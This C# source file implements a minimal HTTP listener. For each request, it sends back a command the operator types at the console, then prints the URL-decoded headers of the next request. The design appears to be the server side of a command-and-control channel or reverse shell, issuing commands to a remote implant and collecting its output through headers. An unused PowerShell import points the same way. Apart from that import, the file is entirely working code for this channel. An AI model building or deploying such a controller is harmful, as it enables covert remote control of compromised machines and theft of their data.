using System;
using System.Net;
using System.IO;
using System.Text;
using System.Management.Automation;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Net.Sockets;
using System.Collections.Generic;

namespace http_server
{
    class Program
    {
        static void Main(string[] args)
        {

            HttpListener server = new HttpListener();  // this is the http server

            string localIP;


            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
            {
                socket.Connect("8.8.8.8", 65530);
                IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                localIP = endPoint.Address.ToString();
            }
            server.Prefixes.Add("http://" + localIP + ":80/");
            server.Start();   // and start the server        
            using (PowerShell powerShell = PowerShell.Create())
            {

                int command_no = 1;
                while (true)
                {

                    HttpListenerContext context = server.GetContext();

                    HttpListenerResponse response = context.Response;
                    string command = context.Request.Url.LocalPath;

                    Console.WriteLine(command);
                    Console.WriteLine(":> ");
                    string message = Console.ReadLine();
                    byte[] buffer = Encoding.UTF8.GetBytes(message + command_no);
                    response.ContentLength64 = buffer.Length;  // set up the messasge's length
                    Stream st = response.OutputStream;  // here we create a stream to send the message
                    st.Write(buffer, 0, buffer.Length); // and this will send all the content to the browser
                    command_no = command_no + 1;
                    context = server.GetContext();

                    string text = context.Request.Headers.ToString();
                    Console.WriteLine(WebUtility.UrlDecode(text));

                    context.Response.Close();  // here we close the connection


                }

            }
            server.Stop();
            server.Close();
        }
       
    }
}
